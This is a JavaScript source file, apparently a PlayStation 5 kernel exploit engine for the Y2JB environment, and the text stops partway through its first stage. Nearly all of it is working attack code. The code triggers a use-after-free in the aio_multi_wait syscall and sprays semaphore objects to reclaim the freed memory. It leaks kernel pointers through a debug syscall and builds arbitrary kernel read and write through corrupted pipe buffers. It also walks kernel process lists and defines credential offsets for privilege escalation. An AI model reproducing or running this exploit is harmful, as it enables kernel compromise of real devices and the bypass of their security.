// y2jb_head.js -- Y2JB BigInt-world adapter for the bagagwa.js engine.
// Classic script (no modules): defines y2jb_make_context() -> X context for
// makeBagagwaEngine(X). Concatenated ahead of the engine body + y2jb_run.js.
// Model: local Uint8Array shadows + remote Y2JB malloc; synced both ways
// around every syscall for pointer args. Defines ONLY y2jb_* top-level names
// (Y2JB globals malloc/syscall/read64/... are used read-only, never shadowed).

const Y2JB_MASK64 = 0xFFFFFFFFFFFFFFFFn;

// number | int64-shim | bigint -> BigInt value (immediates; NOT addresses)
function y2jb_toBig(n) {
    if (typeof n === "bigint") return n;
    if (typeof n === "number") {
        if (!Number.isFinite(n) || Math.floor(n) !== n || n < 0)
            throw new Error("y2jb: bad numeric arg " + n);
        return BigInt(n);
    }
    if (n !== null && typeof n === "object" && typeof n.low === "number") {
        return ((BigInt(n.hi >>> 0) << 32n) | BigInt(n.low >>> 0)) & Y2JB_MASK64;
    }
    throw new Error("y2jb: bad syscall arg");
}

// int64 shim with {low, hi, backing, add32} matching what bagagwa.js needs:
// .low/.hi words, add32() with carry + backing slicing, kernel-ptr checks.
function y2jb_i64(lo, hi) {
    const o = {
        low: (lo >>> 0),
        hi: (hi >>> 0),
        backing: null,
        add32(val) {
            const baseLo = o.low >>> 0;
            const nl = ((baseLo + val) & 0xFFFFFFFF) >>> 0;
            let nh = o.hi >>> 0;
            if (nl < baseLo) nh = (nh + 1) >>> 0;
            const r = y2jb_i64(nl, nh);
            if (o.backing) {
                if (o.backing.byteLength < val) throw new Error("y2jb_i64.add32: overflow");
                r.backing = new Uint8Array(o.backing.buffer, o.backing.byteOffset + val,
                    o.backing.byteLength - val);
            }
            return r;
        },
        sub32(val) {
            const baseLo = o.low >>> 0;
            const nl = ((baseLo - val) & 0xFFFFFFFF) >>> 0;
            let nh = o.hi >>> 0;
            if (nl > baseLo) nh = (nh - 1) >>> 0;
            return y2jb_i64(nl, nh);
        },
        toString(radix) {
            radix = radix || 16;
            const loS = (o.low >>> 0).toString(radix);
            if ((o.hi >>> 0) === 0) return loS;
            const width = radix === 16 ? 8 : Math.ceil(32 / Math.log2(radix));
            let pad = loS;
            while (pad.length < width) pad = "0" + pad;
            return (o.hi >>> 0).toString(radix) + pad;
        }
    };
    return o;
}

// ArrayBuffer -> {remote: BigInt}. Only P.malloc'd buffers are registered;
// unregistered buffers throw loudly instead of corrupting.
const y2jb_memreg = new Map();
function y2jb_findReg(u8) {
    if (!u8 || !u8.buffer) return null;
    return y2jb_memreg.get(u8.buffer) || null;
}

function y2jb_syncOut(u8) {
    const reg = y2jb_findReg(u8);
    if (!reg) throw new Error("y2jb_syncOut: unregistered buffer");
    const base = reg.remote + BigInt(u8.byteOffset);
    const dv = new DataView(u8.buffer, u8.byteOffset, u8.byteLength);
    let i = 0;
    for (; i + 8 <= u8.byteLength; i += 8) write64(base + BigInt(i), dv.getBigUint64(i, true));
    for (; i < u8.byteLength; i++) write8(base + BigInt(i), u8[i]);
}

function y2jb_syncIn(u8) {
    const reg = y2jb_findReg(u8);
    if (!reg) throw new Error("y2jb_syncIn: unregistered buffer");
    const base = reg.remote + BigInt(u8.byteOffset);
    const dv = new DataView(u8.buffer, u8.byteOffset, u8.byteLength);
    let i = 0;
    for (; i + 8 <= u8.byteLength; i += 8) dv.setBigUint64(i, read64(base + BigInt(i)), true);
    for (; i < u8.byteLength; i++) u8[i] = Number(read8(base + BigInt(i))) & 0xFF;
}

// Prefer runtime SYSCALL[name] when present, else raw FreeBSD number.
// NOTE: pipe -> raw PIPE2 (0x2AF) always; runtime "pipe" is the legacy one.
const Y2JB_NUM2NAME = {
    0x003: "read", 0x004: "write", 0x006: "close", 0x014: "getpid",
    0x018: "getuid", 0x05C: "fcntl", 0x036: "ioctl", 0x1DD: "mmap"
};
function y2jb_resolve(num) {
    const nm = Y2JB_NUM2NAME[num];
    if (nm && typeof SYSCALL !== "undefined" && SYSCALL && SYSCALL[nm] !== undefined) {
        const v = SYSCALL[nm];
        return (typeof v === "bigint") ? v : BigInt(v);
    }
    return BigInt(num);
}

async function y2jb_sys(P, num, ...args) {
    if (P.syscalls[num] === undefined)
        throw new Error("sys: no stub 0x" + num.toString(16));
    while (args.length < 6) args.push(0);
    const conv = [];
    const backed = [];
    for (const a of args.slice(0, 6)) {
        if (typeof a === "bigint") { conv.push(a & Y2JB_MASK64); continue; }
        if (typeof a === "number") { conv.push(y2jb_toBig(a)); continue; }
        if (a !== null && typeof a === "object" && a.backing) {
            const reg = y2jb_findReg(a.backing);
            if (!reg) throw new Error("sys: arg backing not registered");
            y2jb_syncOut(a.backing);
            conv.push((reg.remote + BigInt(a.backing.byteOffset)) & Y2JB_MASK64);
            backed.push(a.backing);
            continue;
        }
        conv.push(y2jb_toBig(a)); // int64-shim immediates
    }
    let raw = await syscall(y2jb_resolve(num), conv[0], conv[1], conv[2], conv[3], conv[4], conv[5]);
    raw = (typeof raw === "bigint") ? raw : BigInt(Math.trunc(Number(raw)));
    for (const u8 of backed) y2jb_syncIn(u8);
    const failed = (raw === Y2JB_MASK64); // FreeBSD-raw: u64 -1, never valid here
    const s32 = Number(BigInt.asIntN(32, raw & 0xFFFFFFFFn));
    return {
        raw, s32, failed,
        hex: "0x" + (raw & Y2JB_MASK64).toString(16),
        errText: failed ? "EFAILED" : "ok"
    };
}

async function y2jb_sleep(ms) {
    if (typeof setTimeout === "function") {
        await new Promise((res) => setTimeout(res, ms));
        return;
    }
    const ts = malloc(16);
    write64(ts, BigInt(Math.floor(ms / 1000)));
    write64(ts + 8n, BigInt((ms % 1000) * 1000000));
    await syscall(0xF0n, ts, 0n);
}

function y2jb_make_P() {
    const P = {
        nogc: [],
        gadgets: {},
        syscalls: {},
        malloc(dwords) {
            const bytes = dwords * 4;
            const remote = malloc(bytes); // Y2JB global, sync, BigInt address
            if (typeof remote !== "bigint") throw new Error("y2jb malloc did not return bigint");
            const buf = new ArrayBuffer(bytes);
            const backing = new Uint8Array(buf);
            y2jb_memreg.set(buf, { remote });
            P.nogc.push(backing);
            for (let off = 0; off + 8 <= bytes; off += 8) write64(remote + BigInt(off), 0n);
            for (let off = bytes - (bytes % 8); off < bytes; off++) write8(remote + BigInt(off), 0);
            const ptr = y2jb_i64(Number(remote & 0xFFFFFFFFn), Number((remote >> 32n) & 0xFFFFFFFFn));
            ptr.backing = backing;
            return ptr;
        }
    };
    const ALL_NUMS = [0x29E, 0x29C, 0x295, 0x297, 0x296, 0x298, 0x299, 0x29A, 0x29D, 0x2B0,
        0x225, 0x226, 0x227, 0x228, 0x229, 0x22A, 0x22B, 0x22C, 0x2D7,
        0x2AF, 0x003, 0x004, 0x006, 0x014, 0x018, 0x061, 0x069, 0x076,
        0x1DD, 0x049, 0x0F0, 0x14B, 0x16A, 0x05C, 0x036, 0x017, 0x029];
    for (const n of ALL_NUMS) P.syscalls[n] = true;
    return P;
}

function y2jb_make_context() {
    const P = y2jb_make_P();
    const state = { syscallsIssued: new Set(), fdOpen: new Set(), cleanupFailed: "" };
    const note = (s) => { try { log("[bgw] " + s); } catch (e) {} };
    return {
        P,
        chain: null,
        i64: y2jb_i64,
        sys: (num, ...a) => y2jb_sys(P, num, ...a),
        runChain: async () => {},
        mem: () => { throw new Error("mem() unused in Y2JB mode"); },
        sleep: y2jb_sleep,
        note,
        track: (fd) => { state.fdOpen.add(fd); },
        untrack: (fd) => { state.fdOpen.delete(fd); },
        state,
        driver: { core: 5, origMaskBytes: null, coreWhy: "y2jb" },
        flushMark: (t, d) => { try { log("[bgw:" + t + "] " + d); } catch (e) {} },
        queueEvent: (t, d) => { try { log("[bgw-ev:" + t + "] " + d); } catch (e) {} }
    };
}

function isKernelPtr(v) {
    return v !== null && v !== undefined && v.hi >>> 16 === 0xffff;
}
function isZero64(v) {
    return v !== null && v.low === 0 && v.hi === 0;
}
function isAligned8(v) {
    return v !== null && (v.low & 7) === 0;
}
function hx(v) {
    if (v === null || v === undefined) return "null";
    return "0x" + (v.hi >>> 0).toString(16) + (v.low >>> 0).toString(16).padStart(8, "0");
}
function w16(u8, off, v) { u8[off] = v & 0xff; u8[off + 1] = (v >>> 8) & 0xff; }
function w32(u8, off, v) { u8[off] = v & 0xff; u8[off + 1] = (v >>> 8) & 0xff; u8[off + 2] = (v >>> 16) & 0xff; u8[off + 3] = (v >>> 24) & 0xff; }
function w64(u8, off, v) {
    if (typeof v === "object" && v !== null && "low" in v) {
        w32(u8, off, v.low); w32(u8, off + 4, v.hi);
    } else {
        w32(u8, off, v >>> 0); w32(u8, off + 4, 0);
    }
}
function r16(u8, off) { return u8[off] | (u8[off + 1] << 8); }
function r32(u8, off) { return u8[off] | (u8[off + 1] << 8) | (u8[off + 2] << 16) | (u8[off + 3] << 24); }
let _i64Ctor = null;
function r64(u8, off) {
    const lo = (u8[off] | (u8[off + 1] << 8) | (u8[off + 2] << 16) | (u8[off + 3] << 24)) >>> 0;
    const hi = (u8[off + 4] | (u8[off + 5] << 8) | (u8[off + 6] << 16) | (u8[off + 7] << 24)) >>> 0;
    if (_i64Ctor) return _i64Ctor(lo, hi);
    if (typeof globalThis.int64 === "function") return new globalThis.int64(lo, hi);
    return { low: lo, hi: hi,
        add32(n) { const s = (lo + n) >>> 0; return r64maker(s, hi + (s < lo ? 1 : 0)); },
        toString() { return (hi >>> 0).toString(16) + (lo >>> 0).toString(16).padStart(8, "0"); }
    };
}
function r64maker(lo, hi) {
    return { low: lo >>> 0, hi: hi >>> 0,
        add32(n) { const s = ((lo >>> 0) + n) >>> 0; return r64maker(s, (hi >>> 0) + (s < (lo >>> 0) ? 1 : 0)); },
        toString() { return (hi >>> 0).toString(16) + (lo >>> 0).toString(16).padStart(8, "0"); }
    };
}

const SYS_AIO_INIT        = 0x29E;
const SYS_AIO_CREATE       = 0x29C;
const SYS_AIO_SUBMIT       = 0x295;
const SYS_AIO_MULTI_WAIT   = 0x297;
const SYS_AIO_MULTI_DELETE = 0x296;
const SYS_AIO_MULTI_POLL   = 0x298;
const SYS_AIO_GET_DATA     = 0x299;
const SYS_AIO_MULTI_CANCEL = 0x29A;
const SYS_AIO_SUBMIT_CMD   = 0x29D;
const SYS_AIO_MLOCK        = 0x2B0;

const SYS_OSEM_CREATE  = 0x225;
const SYS_OSEM_DELETE   = 0x226;
const SYS_OSEM_OPEN     = 0x227;
const SYS_OSEM_CLOSE    = 0x228;
const SYS_OSEM_WAIT     = 0x229;
const SYS_OSEM_TRYWAIT  = 0x22A;
const SYS_OSEM_POST     = 0x22B;
const SYS_OSEM_CANCEL   = 0x22C;

const SYS_GET_AIO_DEBUG_REQ_INFO = 0x2D7;

const SYS_PIPE2          = 0x2AF;
const SYS_READ           = 0x003;
const SYS_WRITE          = 0x004;
const SYS_CLOSE          = 0x006;
const SYS_GETPID         = 0x014;
const SYS_SOCKET         = 0x061;
const SYS_SETSOCKOPT     = 0x069;
const SYS_GETSOCKOPT     = 0x076;
const SYS_MMAP           = 0x1DD;
const SYS_MUNMAP         = 0x049;
const SYS_NANOSLEEP      = 0x0F0;
const SYS_SCHED_YIELD    = 0x14B;
const SYS_KQUEUE         = 0x16A;
const SYS_FCNTL          = 0x05C;
const SYS_IOCTL          = 0x036;
const SYS_GETUID         = 0x018;
const SYS_SETUID         = 0x017;
const SYS_DUP            = 0x029;

const WAITER_NODE_SIZE  = 0x38;
const WAITER_OWNER_OFF  = 0x18;
const OSEM_OBJ_ALLOC    = 0x60;
const OSEM_FLAG_OFF     = 0x45;
const OSEM_REFCOUNT_OFF = 0x54;
const UMA_ZONE_128      = 128;

const AIO_MULTI_WAIT_MODE_0 = 0;
const AIO_MULTI_WAIT_MODE_1 = 1;
const AIO_MULTI_WAIT_MODE_2 = 2;

const OSEM_SPRAY_COUNT     = 256;
const OSEM_SPRAY_BATCH     = 64;
const LEAK_ATTEMPTS        = 16;
const UAF_RETRY_MAX        = 32;
const RECLAIM_SPRAY_COUNT  = 512;
const KREAD_RETRIES        = 3;
const PROC_WALK_MAX        = 512;

const PIPE_PAGE_SIZE = 0x4000;
const PIPEBUF_SIZE   = 0x18;

const OFF = {
    PROC_PID:              0xBC,
    PROC_UCRED:            0x40,
    PROC_FD:               0x48,
    PROC_DYNLIB:           0x3E8,
    FILEDESC_OFILES:       0x00,
    FDESCENTTBL_HDR:       0x08,
    FILEDESCENT_SIZE:      0x30,
    FILE_F_DATA:           0x00,
    FILE_F_COUNT:          0x24,
    SOCKET_SO_PCB:         0x18,
    INPCB_PKTOPTS:         0x120,
    IP6PO_RTHDR:           0x70,
    PIPE_SIGIO:            0xD0,
    SIGIO_PROC:            0x00,
    FD_CDIR:               0x18,
    FD_RDIR:               0x10,
    FD_JDIR:               0x20,
    UCRED_CR_UID:          0x04,
    UCRED_CR_RUID:         0x08,
    UCRED_CR_SVUID:        0x0C,
    UCRED_CR_NGROUPS:      0x10,
    UCRED_CR_RGID:         0x14,
    UCRED_CR_SVGID:        0x18,
    UCRED_CR_SCEAUTHID:    0x58,
    UCRED_CR_SCECAPS0:     0x60,
    UCRED_CR_SCECAPS1:     0x68,
    UCRED_ATTRS_QWORD:     0x50,
    DYNLIB_SC_START:       0x308,
    DYNLIB_SC_END:         0x310,
};

const F_SETOWN = 6;
const FIOSETOWN = 0x80047302;

function makeBagagwaEngine(X) {
    const {
        P, chain, i64, sys, runChain, mem, sleep, note,
        track, untrack, state, driver, flushMark, queueEvent,
    } = X;

    _i64Ctor = i64;

    const S = {
        aioInited:       false,
        aioInstances:    [],
        aioRequests:     [],
        uafTriggered:    false,
        uafRequestIdx:   -1,
        osemHandles:     [],
        osemSprayIds:    [],
        leakedAddrs:     [],
        targetOsemAddr:  null,
        targetOsemIdx:   -1,

        aioRfd: -1, aioWfd: -1,
        masterRfd: -1, masterWfd: -1,
        victimRfd: -1, victimWfd: -1,
        masterFp: null, victimFp: null,
        masterPipeData: null, victimPipeData: null,
        fdOfiles: null,
        curproc: null, allproc: null,

        kernelWrites: 0,
        jailbroken: false,
        aliasesRepaired: false,
    };

    function alloc(size, label) {
        const dwords = Math.ceil(size / 4);
        const ptr = P.malloc(dwords, 1);
        let u8;
        if (ptr.backing) {
            u8 = new Uint8Array(ptr.backing.buffer, ptr.backing.byteOffset, dwords * 4);
        } else {
            u8 = new Uint8Array(dwords * 4);
        }
        if (!P.nogc) P.nogc = [];
        P.nogc.push(u8);
        return { base: ptr, u8, bytes: size, label };
    }

    async function initAio() {
        if (S.aioInited) return { ok: true, cached: true };
        const r = await sys(SYS_AIO_INIT, 0, 0);
        if (r.failed) return { ok: false, why: "aio_init failed: " + r.errText };
        S.aioInited = true;
        note("AIO subsystem initialized");
        return { ok: true };
    }

    async function createAioInstance() {
        const r = await sys(SYS_AIO_CREATE, 0);
        if (r.failed) return { ok: false, why: "aio_create failed: " + r.errText };
        const id = r.s32;
        S.aioInstances.push(id);
        return { ok: true, id };
    }

    async function submitAioRequest(instanceId, buf, size, fd, offset) {
        const reqBuf = alloc(0x40, "aio-request-" + S.aioRequests.length);
        w32(reqBuf.u8, 0x00, fd);
        w64(reqBuf.u8, 0x08, buf);
        w64(reqBuf.u8, 0x10, i64(size, 0));
        w64(reqBuf.u8, 0x18, offset || i64(0, 0));
        w32(reqBuf.u8, 0x20, 0);

        const r = await sys(SYS_AIO_SUBMIT, instanceId, reqBuf.base, 1);
        if (r.failed) return { ok: false, why: "aio_submit failed: " + r.errText };
        const reqId = r.s32;
        S.aioRequests.push({ id: reqId, instanceId, buf: reqBuf });
        return { ok: true, reqId };
    }

    async function triggerUaf(numRequests) {
        const num = numRequests || 2;
        if (S.aioRequests.length < num)
            return { ok: false, why: "need at least " + num + " AIO requests, have " + S.aioRequests.length };

        const instanceId = S.aioRequests[0].instanceId;

        const reqIdBuf = alloc(num * 4, "aio-multi-wait-ids");
        for (let i = 0; i < num; i++) {
            w32(reqIdBuf.u8, i * 4, S.aioRequests[i].id);
        }

        // PS5 AIO syscalls all take instanceId as first arg
        // (aio_submit, aio_multi_poll, aio_multi_delete all do).
        // aio_multi_wait(instanceId, ids, num, mode)
        // Mode 0 links shared waiter node → cleanup frees → UAF.
        // Requests stay pending; triggerWaker writes to pipe later
        // to complete them, firing the waker on the dangling node.
        note("triggering aio_multi_wait mode 0: instance=" +
            instanceId + " num=" + num);
        flushMark("BAGAGWA-UAF-PRE", "inst=" + instanceId +
            "-num=" + num + "-mode=0");

        const r = await sys(SYS_AIO_MULTI_WAIT,
            instanceId, reqIdBuf.base, num, AIO_MULTI_WAIT_MODE_0);

        flushMark("BAGAGWA-UAF-POST", "ret=" + r.s32 + "-" + r.errText);

        S.uafTriggered = true;
        S.uafRequestIdx = 0;
        return { ok: true, ret: r.s32 };
    }

    async function sprayOsem(count, batchSize) {
        const n = count || OSEM_SPRAY_COUNT;
        const batch = batchSize || OSEM_SPRAY_BATCH;
        const handles = [];
        let created = 0;

        const nameBuf = alloc(32, "osem-name");
        const attrBuf = alloc(0x20, "osem-attr");
        w32(attrBuf.u8, 0x00, 1);
        w32(attrBuf.u8, 0x04, 0);
        w32(attrBuf.u8, 0x08, 1);

        for (let base = 0; base < n; base += batch) {
            const nb = Math.min(batch, n - base);
            for (let i = 0; i < nb; i++) {
                const nameStr = "bgw_" + (base + i);
                for (let c = 0; c < nameStr.length; c++)
                    nameBuf.u8[c] = nameStr.charCodeAt(c);
                nameBuf.u8[nameStr.length] = 0;

                const r = await sys(SYS_OSEM_CREATE, nameBuf.base, attrBuf.base);
                if (r.failed) {
                    note("osem_create failed at index " + (base + i) + ": " + r.errText);
                    break;
                }
                handles.push(r.s32);
                created++;
            }
            if (created < base + nb) break;
        }

        S.osemHandles = S.osemHandles.concat(handles);
        S.osemSprayIds = handles.slice();

        flushMark("BAGAGWA-OSEM-SPRAY", "created=" + created + "-target=" + n);
        note("sprayed " + created + " osem objects into 128-byte UMA zone");
        return { ok: created > 0, count: created, handles };
    }

    async function leakViaDebugInfo(reqId, tableIdx) {
        if (P.syscalls[SYS_GET_AIO_DEBUG_REQ_INFO] === undefined) {
            return { ok: false, why: "syscall 727 (0x2D7) stub not in firmware profile" };
        }

        const outBuf = alloc(0x100, "aio-debug-leak");
        for (let i = 0; i < 0x100; i++) outBuf.u8[i] = 0;

        const composedId = ((tableIdx & 0x7F) << 16) | (reqId & 0xFFFF);

        const r = await sys(SYS_GET_AIO_DEBUG_REQ_INFO, composedId, outBuf.base, 0x100);
        if (r.failed) return { ok: false, why: "get_aio_debug_request_info failed: " + r.errText };

        const leaked = [];
        for (let off = 0; off + 8 <= 0x100; off += 8) {
            const v = r64(outBuf.u8, off);
            if (isKernelPtr(v)) {
                leaked.push({ offset: off, value: v });
            }
        }

        for (let off = 0; off + 4 <= 0x100; off += 4) {
            const dw = r32(outBuf.u8, off) >>> 0;
            if (dw !== 0 && (dw & 0xFFFF0000) !== 0) {
                const existing = leaked.find(l => l.offset === (off & ~7));
                if (!existing) {
                    leaked.push({ offset: off, dword: dw });
                }
            }
        }

        S.leakedAddrs = S.leakedAddrs.concat(leaked);
        flushMark("BAGAGWA-LEAK", "composedId=0x" + composedId.toString(16) +
            "-leaked=" + leaked.length + "-ptrs");
        return { ok: leaked.length > 0, leaked };
    }

    async function triggerWaker(requestIdx) {
        const idx = requestIdx !== undefined ? requestIdx : S.uafRequestIdx;
        if (idx < 0 || idx >= S.aioRequests.length)
            return { ok: false, why: "invalid request index " + idx };
        if (S.aioWfd < 0)
            return { ok: false, why: "AIO write-end pipe not available" };

        const req = S.aioRequests[idx];

        const pipeBuf = alloc(64, "waker-pipe-data");
        for (let i = 0; i < 64; i++) pipeBuf.u8[i] = 0x41;
        const wr = await sys(SYS_WRITE, S.aioWfd, pipeBuf.base, 64);

        flushMark("BAGAGWA-WAKER-TRIGGER", "reqIdx=" + idx +
            "-reqId=" + req.id + "-aioWfd=" + S.aioWfd + "-writeRet=" + wr.s32);

        await sleep(100);

        const pollBuf = alloc(4, "waker-poll");
        const pr = await sys(SYS_AIO_MULTI_POLL, req.instanceId, pollBuf.base, 1, 0);

        return { ok: !wr.failed, writeRet: wr.s32, pollRet: pr.s32 };
    }

    async function manipulateOsemRefcount(targetHandle, decrements) {
        const n = decrements || 1;
        for (let i = 0; i < n; i++) {
            const r = await sys(SYS_OSEM_CLOSE, targetHandle);
            if (r.failed) {
                return { ok: false, why: "osem_close failed at decrement " + i + ": " + r.errText, decremented: i };
            }
        }
        return { ok: true, decremented: n };
    }

    async function setupPipes() {
        const buf = alloc(8, "pipe-fds");

        w32(buf.u8, 0, 0); w32(buf.u8, 4, 0);
        let r = await sys(SYS_PIPE2, buf.base, 0);
        if (r.failed) return { ok: false, why: "pipe2 (master) failed: " + r.errText };
        S.masterRfd = r32(buf.u8, 0) | 0;
        S.masterWfd = r32(buf.u8, 4) | 0;
        track(S.masterRfd); track(S.masterWfd);

        w32(buf.u8, 0, 0); w32(buf.u8, 4, 0);
        r = await sys(SYS_PIPE2, buf.base, 0);
        if (r.failed) return { ok: false, why: "pipe2 (victim) failed: " + r.errText };
        S.victimRfd = r32(buf.u8, 0) | 0;
        S.victimWfd = r32(buf.u8, 4) | 0;
        track(S.victimRfd); track(S.victimWfd);

        const seedBuf = alloc(1, "pipe-seed");
        seedBuf.u8[0] = 0x41;
        await sys(SYS_WRITE, S.masterWfd, seedBuf.base, 1);
        await sys(SYS_WRITE, S.victimWfd, seedBuf.base, 1);

        note("pipes: master r=" + S.masterRfd + " w=" + S.masterWfd +
             ", victim r=" + S.victimRfd + " w=" + S.victimWfd);
        return { ok: true };
    }

    async function kreadFast(src, destBuf, n) {
        if (!S.masterPipeData || !S.victimPipeData) return -1;
        const pb = alloc(PIPEBUF_SIZE, "kread-pipebuf");
        w32(pb.u8, 0x00, n);
        w32(pb.u8, 0x04, 0);
        w32(pb.u8, 0x08, 0);
        w32(pb.u8, 0x0c, PIPE_PAGE_SIZE);
        w64(pb.u8, 0x10, src);

        await sys(SYS_WRITE, S.masterWfd, pb.base, PIPEBUF_SIZE);
        await sys(SYS_READ, S.masterRfd, pb.base, PIPEBUF_SIZE);

        const r = await sys(SYS_READ, S.victimRfd, destBuf.base, n);
        return r.failed ? -1 : r.s32;
    }

    async function kwriteFast(dest, srcBuf, n) {
        if (!S.masterPipeData || !S.victimPipeData) return -1;
        const pb = alloc(PIPEBUF_SIZE, "kwrite-pipebuf");
        w32(pb.u8, 0x00, 0);
        w32(pb.u8, 0x04, 0);
        w32(pb.u8, 0x08, 0);
        w32(pb.u8, 0x0c, PIPE_PAGE_SIZE);
        w64(pb.u8, 0x10, dest);

        await sys(SYS_WRITE, S.masterWfd, pb.base, PIPEBUF_SIZE);
        await sys(SYS_READ, S.masterRfd, pb.base, PIPEBUF_SIZE);

        const r = await sys(SYS_WRITE, S.victimWfd, srcBuf.base, n);
        S.kernelWrites++;
        return r.failed ? -1 : r.s32;
    }

    async function kread64Fast(addr) {
        const buf = alloc(8, "kr64");
        for (let i = 0; i < 8; i++) buf.u8[i] = 0xEE;
        const ret = await kreadFast(addr, buf, 8);
        return { ret, v: r64(buf.u8, 0) };
    }

    async function kread32Fast(addr) {
        const buf = alloc(4, "kr32");
        for (let i = 0; i < 4; i++) buf.u8[i] = 0xEE;
        const ret = await kreadFast(addr, buf, 4);
        return { ret, v: r32(buf.u8, 0) >>> 0 };
    }

    async function kwrite64Fast(addr, v) {
        const buf = alloc(8, "kw64");
        w64(buf.u8, 0, v);
        return await kwriteFast(addr, buf, 8);
    }

    async function kwrite32Fast(addr, v) {
        const buf = alloc(4, "kw32");
        w32(buf.u8, 0, v >>> 0);
        return await kwriteFast(addr, buf, 4);
    }

    async function fgetFast(fd) {
        if (!S.fdOfiles) return { ret: -1, v: i64(0, 0) };
        return await kread64Fast(S.fdOfiles.add32(fd * OFF.FILEDESCENT_SIZE));
    }

    async function findCurproc() {
        const pidR = await sys(SYS_GETPID);
        if (pidR.failed || pidR.s32 <= 0)
            return { ok: false, why: "getpid failed: " + pidR.errText };
        const pid = pidR.s32;

        const pipeBuf = alloc(8, "sigio-pipe");
        w32(pipeBuf.u8, 0, 0); w32(pipeBuf.u8, 4, 0);
        const pr = await sys(SYS_PIPE2, pipeBuf.base, 0);
        if (pr.failed) return { ok: false, why: "pipe2 failed: " + pr.errText };
        const rfd = r32(pipeBuf.u8, 0) | 0;
        const wfd = r32(pipeBuf.u8, 4) | 0;

        try {
            const ownBuf = alloc(4, "sigio-own");
            w32(ownBuf.u8, 0, pid);
            let own = await sys(SYS_IOCTL, rfd, i64(FIOSETOWN, 0), ownBuf.base);
            if (own.failed) {
                own = await sys(SYS_FCNTL, rfd, F_SETOWN, pid);
            }
            if (own.failed) return { ok: false, why: "FIOSETOWN/F_SETOWN failed: " + own.errText };

            const fp = await fgetFast(rfd);
            if (!isKernelPtr(fp.v)) return { ok: false, why: "sigio fp " + hx(fp.v) };
            const fdata = await kread64Fast(fp.v.add32(OFF.FILE_F_DATA));
            if (!isKernelPtr(fdata.v)) return { ok: false, why: "f_data " + hx(fdata.v) };
            const sigio = await kread64Fast(fdata.v.add32(OFF.PIPE_SIGIO));
            if (!isKernelPtr(sigio.v)) return { ok: false, why: "pipe_sigio " + hx(sigio.v) };
            const proc = await kread64Fast(sigio.v.add32(OFF.SIGIO_PROC));
            if (!isKernelPtr(proc.v)) return { ok: false, why: "curproc " + hx(proc.v) };
            return { ok: true, curproc: proc.v, pid };
        } finally {
            await sys(SYS_CLOSE, wfd);
            await sys(SYS_CLOSE, rfd);
        }
    }

    async function findProcByPid(startProc, linkOff, wantPid) {
        let p = startProc;
        for (let i = 0; i < PROC_WALK_MAX; i++) {
            if (isZero64(p) || !isKernelPtr(p)) return null;
            const pid = await kread32Fast(p.add32(OFF.PROC_PID));
            if (pid.ret === 4 && pid.v === wantPid) return p;
            const nxt = await kread64Fast(p.add32(linkOff));
            if (nxt.ret !== 8) return null;
            p = nxt.v;
        }
        return null;
    }

    async function findAllproc() {
        if (S.allproc) return { ok: true, addr: S.allproc };
        if (!S.curproc) return { ok: false, why: "need curproc first" };
        let p = S.curproc;
        for (let i = 0; i < PROC_WALK_MAX; i++) {
            if (!isKernelPtr(p)) return { ok: false, why: "not canonical at hop " + i };
            if (p.hi >>> 0 === 0xffffffff) {
                S.allproc = p;
                return { ok: true, addr: p, hops: i };
            }
            const nxt = await kread64Fast(p.add32(0x08));
            if (nxt.ret !== 8) return { ok: false, why: "unreadable at hop " + i };
            p = nxt.v;
        }
        return { ok: false, why: "exhausted walk" };
    }

    async function findRootvnode() {
        const ap = await findAllproc();
        if (!ap.ok) return { ok: false, why: "allproc: " + ap.why };
        const head = await kread64Fast(ap.addr);
        if (head.ret !== 8 || !isKernelPtr(head.v))
            return { ok: false, why: "*allproc = " + hx(head.v) };

        const KERNEL_PID = 0;
        const init = await findProcByPid(head.v, 0x00, KERNEL_PID);
        if (!init) return { ok: false, why: "kernel proc not found" };

        const initFd = await kread64Fast(init.add32(OFF.PROC_FD));
        if (initFd.ret !== 8 || !isKernelPtr(initFd.v))
            return { ok: false, why: "kernel p_fd = " + hx(initFd.v) };

        const rv = await kread64Fast(initFd.v.add32(OFF.FD_CDIR));
        if (rv.ret !== 8 || !isKernelPtr(rv.v))
            return { ok: false, why: "rootvnode = " + hx(rv.v) };
        return { ok: true, init, initFd: initFd.v, rootvnode: rv.v };
    }

    async function stage0_uaf(opts) {
        const o = opts || {};
        const out = { ok: false, why: "", steps: [] };

        note("=== Stage 0: aio_multi_wait mode 0 UAF ===");

        const stubs = [
            [SYS_AIO_INIT, "aio_init"],
            [SYS_AIO_CREATE, "aio_create"],
            [SYS_AIO_SUBMIT, "aio_submit"],
            [SYS_AIO_MULTI_WAIT, "aio_multi_wait"],
            [SYS_PIPE2, "pipe2"],
            [SYS_READ, "read"],
            [SYS_WRITE, "write"],
        ];
        const missing = stubs.filter(([num]) => P.syscalls[num] === undefined);
        if (missing.length) {
            out.why = "missing syscall stubs: " + missing.map(([n, l]) =>
                "0x" + n.toString(16) + " (" + l + ")").join(", ");
            return out;
        }
        out.steps.push("syscall stubs verified");

        const ir = await initAio();
        if (!ir.ok) { out.why = ir.why; return out; }
        out.steps.push("AIO initialized");

        const pipeBuf = alloc(8, "uaf-pipe");
        w32(pipeBuf.u8, 0, 0); w32(pipeBuf.u8, 4, 0);
        const pipeR = await sys(SYS_PIPE2, pipeBuf.base, 0);
        if (pipeR.failed) { out.why = "pipe2 for AIO failed: " + pipeR.errText; return out; }
        S.aioRfd = r32(pipeBuf.u8, 0) | 0;
        S.aioWfd = r32(pipeBuf.u8, 4) | 0;
        track(S.aioRfd); track(S.aioWfd);
        out.steps.push("AIO pipe: r=" + S.aioRfd + " w=" + S.aioWfd);

        const numRequests = o.numRequests || 2;

        const fillSize = 64 * numRequests;
        const fillBuf = alloc(fillSize, "uaf-pipe-fill");
        for (let j = 0; j < fillSize; j++) fillBuf.u8[j] = 0x41;
        const fillR = await sys(SYS_WRITE, S.aioWfd, fillBuf.base, fillSize);
        if (fillR.failed) { out.why = "pipe fill: " + fillR.errText; return out; }
        out.steps.push("pipe pre-filled " + fillSize + "B (reads complete immediately)");

        const ci = await createAioInstance();
        if (!ci.ok) { out.why = ci.why; return out; }
        out.steps.push("AIO instance created: " + ci.id);

        const dataBuf = alloc(64, "aio-data");
        for (let i = 0; i < numRequests; i++) {
            const sr = await submitAioRequest(ci.id, dataBuf.base, 64, S.aioRfd, i64(0, 0));
            if (!sr.ok) { out.why = sr.why; return out; }
            out.steps.push("AIO request " + i + " submitted: id=" + sr.reqId);
        }

        const uafR = await triggerUaf(numRequests);
        out.steps.push("aio_multi_wait mode 0 returned: " + uafR.ret);

        if (!S.uafTriggered) {
            out.why = "UAF trigger did not fire";
            return out;
        }

        out.ok = true;
